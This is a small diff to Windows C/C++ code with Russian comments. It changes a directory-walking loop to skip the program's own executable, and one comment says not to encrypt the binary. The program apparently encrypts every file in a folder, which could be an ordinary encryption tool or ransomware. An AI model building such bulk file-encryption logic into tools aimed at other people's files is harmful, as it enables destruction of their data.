@@ -76,7 +76,7 @@ SelectModeLoop:
     do
     {
          MyFindFileName = FindFileData.cFileName;
-         if((wcscmp(MyFindFileName, L".")) && (wcscmp(MyFindFileName, L"..")))
+         if((wcscmp(MyFindFileName, L".")) && (wcscmp(MyFindFileName, L"..")) && (wcscmp(MyFindFileName, WEXE_NAME)))
          {
               //wprintf(L"%s\n", MyFindFileName);
               uAllFilesCount++;
@@ -99,7 +99,7 @@ SelectModeLoop:
     {
         MyFindFileName = FindFileData.cFileName;
 
-        if(!(wcscmp(MyFindFileName, WEXE_NAME))) //Сравнение имени файла с именем программы
+        if(!(wcscmp(MyFindFileName, WEXE_NAME))) //Сравнение имени файла с именем программы, не криптовать бинарник
         {
             continue;
         }
